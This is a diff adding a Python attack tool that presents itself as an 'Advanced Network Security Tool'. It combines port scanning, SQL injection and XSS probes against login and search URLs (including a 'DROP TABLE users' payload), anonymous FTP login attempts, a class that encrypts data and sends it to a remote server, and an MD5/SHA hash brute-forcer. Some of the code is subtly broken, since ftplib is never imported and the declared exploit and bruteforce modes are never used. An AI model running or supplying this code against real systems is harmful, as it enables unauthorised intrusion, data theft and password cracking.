@@ -1,0 +1,318 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import random
+import hashlib
+import socket
+import threading
+import argparse
+import requests
+import json
+import time
+import numpy as np
+import pandas as pd
+import matplotlib.pyplot as plt
+from cryptography.fernet import Fernet
+from scapy.all import *
+
+class NetworkScanner:
+    def __init__(self, target_ip):
+        self.target_ip = target_ip
+        self.open_ports = []
+        self.services = {}
+        
+    def tcp_scan(self, port_range):
+        print(f"[*] Starting TCP scan on {self.target_ip}")
+        for port in range(port_range[0], port_range[1] + 1):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                result = s.connect_ex((self.target_ip, port))
+                if result == 0:
+                    service = self._identify_service(port)
+                    self.open_ports.append(port)
+                    self.services[port] = service
+                    print(f"[+] Port {port} is open: {service}")
+                s.close()
+            except:
+                pass
+                
+    def _identify_service(self, port):
+        common_ports = {
+            21: "FTP",
+            22: "SSH",
+            23: "Telnet",
+            25: "SMTP",
+            53: "DNS",
+            80: "HTTP",
+            443: "HTTPS",
+            3306: "MySQL",
+            5432: "PostgreSQL",
+            8080: "HTTP-Proxy"
+        }
+        return common_ports.get(port, "Unknown")
+    
+    def udp_scan(self, port_range):
+        print(f"[*] Starting UDP scan on {self.target_ip}")
+        for port in range(port_range[0], port_range[1] + 1):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(1)
+                s.sendto(b"", (self.target_ip, port))
+                data, addr = s.recvfrom(1024)
+                self.open_ports.append(port)
+                print(f"[+] Port {port}/udp is open")
+                s.close()
+            except:
+                pass
+                
+    def run_scapy_scan(self):
+        print(f"[*] Running advanced scan with Scapy on {self.target_ip}")
+        ans, unans = sr(IP(dst=self.target_ip)/TCP(dport=[21,22,23,25,80,443], flags="S"), timeout=2, verbose=0)
+        for sent, received in ans:
+            if received.haslayer(TCP) and received.getlayer(TCP).flags == 0x12:  # SYN-ACK
+                print(f"[+] Port {sent.dport} is open")
+                self.open_ports.append(sent.dport)
+                
+    def generate_report(self):
+        print("\n[*] Scan Report:")
+        print(f"Target: {self.target_ip}")
+        print(f"Open Ports: {len(self.open_ports)}")
+        for port in self.open_ports:
+            service = self.services.get(port, "Unknown")
+            print(f"  - {port}/tcp: {service}")
+
+class VulnerabilityScanner:
+    def __init__(self, target_ip, open_ports):
+        self.target_ip = target_ip
+        self.open_ports = open_ports
+        self.vulnerabilities = []
+        
+    def check_http_vulnerabilities(self, port):
+        try:
+            url = f"http://{self.target_ip}:{port}"
+            response = requests.get(url, timeout=3)
+            
+            # Check for Server header
+            server = response.headers.get('Server', '')
+            if server:
+                print(f"[*] Server running: {server}")
+                if any(v in server.lower() for v in ['apache/2.2', 'nginx/1.0', 'iis/6']):
+                    self.vulnerabilities.append(f"Outdated web server: {server}")
+            
+            # Check for SQL injection
+            payloads = ["' OR '1'='1", "admin' --", "1; DROP TABLE users"]
+            for payload in payloads:
+                try:
+                    inj_url = f"{url}/login?username={payload}&password=test"
+                    inj_response = requests.get(inj_url, timeout=2)
+                    if 'error' in inj_response.text.lower() and 'sql' in inj_response.text.lower():
+                        self.vulnerabilities.append(f"Possible SQL injection at {inj_url}")
+                except:
+                    pass
+                    
+            # Check for XSS
+            xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
+            for payload in xss_payloads:
+                try:
+                    xss_url = f"{url}/search?q={payload}"
+                    xss_response = requests.get(xss_url, timeout=2)
+                    if payload in xss_response.text:
+                        self.vulnerabilities.append(f"Possible XSS vulnerability at {xss_url}")
+                except:
+                    pass
+        except:
+            pass
+            
+    def check_ssh_vulnerabilities(self, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.target_ip, port))
+            banner = s.recv(1024).decode('utf-8')
+            s.close()
+            
+            if 'SSH-2.0-OpenSSH_5' in banner or 'SSH-2.0-OpenSSH_6' in banner:
+                self.vulnerabilities.append(f"Outdated SSH version: {banner.strip()}")
+                
+        except:
+            pass
+            
+    def check_ftp_vulnerabilities(self, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.target_ip, port))
+            banner = s.recv(1024).decode('utf-8')
+            s.close()
+            
+            if 'FTP' in banner:
+                # Try anonymous login
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(self.target_ip, port)
+                    ftp.login('anonymous', 'password')
+                    ftp.quit()
+                    self.vulnerabilities.append("Anonymous FTP login allowed")
+                except:
+                    pass
+                    
+                # Check for outdated FTP servers
+                if any(v in banner.lower() for v in ['vsftpd 2.3.4', 'proftpd 1.3.3']):
+                    self.vulnerabilities.append(f"Vulnerable FTP server: {banner.strip()}")
+        except:
+            pass
+    
+    def scan_all_ports(self):
+        for port in self.open_ports:
+            print(f"[*] Checking vulnerabilities on port {port}")
+            if port == 80 or port == 443 or port == 8080:
+                self.check_http_vulnerabilities(port)
+            elif port == 22:
+                self.check_ssh_vulnerabilities(port)
+            elif port == 21:
+                self.check_ftp_vulnerabilities(port)
+                
+    def generate_report(self):
+        print("\n[*] Vulnerability Report:")
+        if not self.vulnerabilities:
+            print("No vulnerabilities found.")
+        else:
+            print(f"Found {len(self.vulnerabilities)} potential vulnerabilities:")
+            for i, vuln in enumerate(self.vulnerabilities, 1):
+                print(f"  {i}. {vuln}")
+                
+class DataExfiltration:
+    def __init__(self, encryption_key=None):
+        if encryption_key:
+            self.key = encryption_key
+        else:
+            self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
+        
+    def encrypt_file(self, file_path):
+        try:
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+            encrypted_data = self.cipher.encrypt(file_data)
+            encrypted_file = file_path + '.encrypted'
+            with open(encrypted_file, 'wb') as file:
+                file.write(encrypted_data)
+            return encrypted_file
+        except Exception as e:
+            print(f"Error encrypting file: {e}")
+            return None
+            
+    def decrypt_file(self, encrypted_file_path):
+        try:
+            with open(encrypted_file_path, 'rb') as file:
+                encrypted_data = file.read()
+            decrypted_data = self.cipher.decrypt(encrypted_data)
+            decrypted_file = encrypted_file_path.replace('.encrypted', '.decrypted')
+            with open(decrypted_file, 'wb') as file:
+                file.write(decrypted_data)
+            return decrypted_file
+        except Exception as e:
+            print(f"Error decrypting file: {e}")
+            return None
+            
+    def exfiltrate_data(self, data, remote_server, port):
+        try:
+            encrypted_data = self.cipher.encrypt(data.encode())
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((remote_server, port))
+            s.send(encrypted_data)
+            s.close()
+            return True
+        except Exception as e:
+            print(f"Error exfiltrating data: {e}")
+            return False
+            
+class PasswordCracker:
+    def __init__(self):
+        self.common_passwords = [
+            "password", "123456", "12345678", "admin", "welcome",
+            "123456789", "12345", "1234", "qwerty", "letmein",
+            "monkey", "abc123", "password1", "1234567", "dragon"
+        ]
+        
+    def hash_password(self, password, salt="", algorithm="md5"):
+        pw = (salt + password).encode()
+        if algorithm.lower() == "md5":
+            return hashlib.md5(pw).hexdigest()
+        elif algorithm.lower() == "sha1":
+            return hashlib.sha1(pw).hexdigest()
+        elif algorithm.lower() == "sha256":
+            return hashlib.sha256(pw).hexdigest()
+        else:
+            return hashlib.md5(pw).hexdigest()
+            
+    def crack_hash(self, target_hash, algorithm="md5", salt=""):
+        print(f"[*] Attempting to crack hash: {target_hash}")
+        
+        # Try common passwords
+        for password in self.common_passwords:
+            hashed = self.hash_password(password, salt, algorithm)
+            if hashed == target_hash:
+                return password
+                
+        # Try brute force (very simple implementation)
+        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+        for length in range(1, 6):  # Try passwords up to length 5
+            for pwd in self._generate_passwords(chars, length):
+                hashed = self.hash_password(pwd, salt, algorithm)
+                if hashed == target_hash:
+                    return pwd
+        
+        return None
+        
+    def _generate_passwords(self, chars, length, current=""):
+        if length == 0:
+            yield current
+            return
+        for char in chars:
+            yield from self._generate_passwords(chars, length-1, current + char)
+            
+def main():
+    parser = argparse.ArgumentParser(description="Advanced Network Security Tool")
+    parser.add_argument("target", help="Target IP address")
+    parser.add_argument("--ports", "-p", default="1-1000", help="Port range to scan (e.g., 1-1000)")
+    parser.add_argument("--mode", "-m", choices=["scan", "exploit", "bruteforce"], default="scan", help="Mode of operation")
+    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
+    
+    args = parser.parse_args()
+    
+    if args.verbose:
+        print("""
+        #############################################
+        #                                           #
+        #      ADVANCED NETWORK SECURITY TOOL       #
+        #                                           #
+        #############################################
+        """)
+        
+    # Parse port range
+    port_range = args.ports.split("-")
+    start_port = int(port_range[0])
+    end_port = int(port_range[1]) if len(port_range) > 1 else start_port
+    
+    # Create scanner
+    scanner = NetworkScanner(args.target)
+    
+    # Run scan
+    scanner.tcp_scan((start_port, end_port))
+    scanner.generate_report()
+    
+    # If we found open ports, check for vulnerabilities
+    if scanner.open_ports:
+        vuln_scanner = VulnerabilityScanner(args.target, scanner.open_ports)
+        vuln_scanner.scan_all_ports()
+        vuln_scanner.generate_report()
+        
+    print("\n[*] Scan complete!")
+    
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Scan interrupted by user. Exiting...")
+        sys.exit(0)
